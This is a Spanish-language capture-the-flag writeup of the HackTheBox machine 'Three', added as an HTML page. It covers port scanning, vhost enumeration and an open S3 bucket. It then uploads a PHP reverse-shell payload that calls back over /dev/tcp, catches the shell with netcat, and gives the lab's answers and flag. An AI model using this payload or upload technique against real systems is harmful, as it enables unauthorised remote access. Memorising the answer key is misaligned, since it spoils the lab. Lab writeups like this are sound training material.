@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Three HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/three.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Three HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Three de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Three de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Three HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Three HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Three de la plataforma de HackTheBox","headline":"Writeup Three HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Three HackTheBox</h1>
+          <p>Resolución de la máquina Three de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.140.61
+Nmap scan report for 10.129.140.61
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Buscamos por algo que acabe en .htb en la web y encontramos un dominio, lo agregamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.129.140.61 | </span><span class="s2">grep </span><span class="p">-oP </span><span class="no">"@(.*?).htb" </span><span class="p">
+@</span><span class="kd">thetoppers.htb</span><span class="p">
+
+</span><span class="s2">❯ echo </span><span class="no">"10.129.140.61 thetoppers.htb" </span><span class="p">|</span><span class="s2"> sudo tee </span><span class="p">-a /etc/hosts
+10.129.140.61 thetoppers.htb</span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos un dominio valido podemos buscar un subdominio valido en el, encontramos s3</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">vhost -u thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100
+===============================================================
+[+] Url:          http://thetoppers.htb
+[+] Threads:      100
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">s3.thetoppers.htb</span><span class="p"> (Status: 404) [Size: 21]</span>
+</code></pre></div></div>
+
+<div><p>Lo agregamos al /etc/hosts y al hacerle un curl podemos ver running como status</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"10.129.140.61 s3.thetoppers.htb" </span><span class="p">|</span><span class="s2"> sudo tee </span><span class="p">-a /etc/hosts
+10.129.140.61 thetoppers.htb
+
+</span><span class="s2">❯ curl </span><span class="p">-s s3.thetoppers.htb     
+{</span><span class="na">"status"</span><span class="p">:</span><span class="s2"> "running"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<div><p>Usaremos aws, iniciaremos por hacer un configure pasandole cualquier dato</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ aws </span><span class="p">configure
+AWS Access Key ID [****************test]: </span><span class="kd">test</span><span class="p">
+AWS Secret Access Key [****************test]: </span><span class="kd">test</span><span class="p">
+Default region name [test]: </span><span class="kd">test</span><span class="p">
+Default output format [test]: </span><span class="kd">test</span>
+</code></pre></div></div>
+
+<div><p>Ahora usando como endpoint la web podemos intentar con ls ver los archivos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ aws </span><span class="p">--endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb 
+                           PRE images/
+2023-01-23 19:00:42          0 .htaccess
+2023-01-23 19:00:42      11952 index.php</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un index por lo que puede ser la pagina principal, creamos una reverse shell en php y la copiamos a el servidor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> shell.php
+&lt?php
+    system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'")
+?>
+
+</span><span class="s2">❯ aws </span><span class="p">--endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php</span>
+</code></pre></div></div>
+
+<div><p>Una vez subida podemos invocarla como curl y con netcat recibimos la shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">thetoppers.htb/shell.php
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.140.61
+</span><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ hostname -I
+10.129.140.61 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:5de8 
+</span><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si damos un vistazo un directorio atrás podemos ver la flag y leerla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ ls ..
+flag.txt
+html
+</span><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ cat /var/www/flag.txt
+a980d99281a28d638ac68b9bf9453c2b
+</span><span class="s2">www-data@three</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>How many TCP ports are open?</strong></li>
+<ul><p></p><li>2</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the domain of the email address provided in the "Contact" section of the website?</strong></li>
+<ul><p></p><li>thetoppers.htb</li></ul></blockquote><br>
+
+<blockquote><li><strong>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</strong></li>
+<ul><p></p><li>/etc/hosts</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which sub-domain is discovered during further enumeration?</strong></li>
+<ul><p></p><li>s3.thetoppers.htb</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which service is running on the discovered sub-domain?</strong></li>
+<ul><p></p><li>amazon s3</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which command line utility can be used to interact with the service running on the discovered sub-domain?</strong></li>
+<ul><p></p><li>awscli</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which command is used to set up the AWS CLI installation?</strong></li>
+<ul><p></p><li>aws configure</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the command used by the above utility to list all of the S3 buckets?</strong></li>
+<ul><p></p><li>aws s3 ls</li></ul></blockquote><br>
+
+<blockquote><li><strong>This server is configured to run files written in what web scripting language?</strong></li>
+<ul><p></p><li>php</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>a980d99281a28d638ac68b9bf9453c2b</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
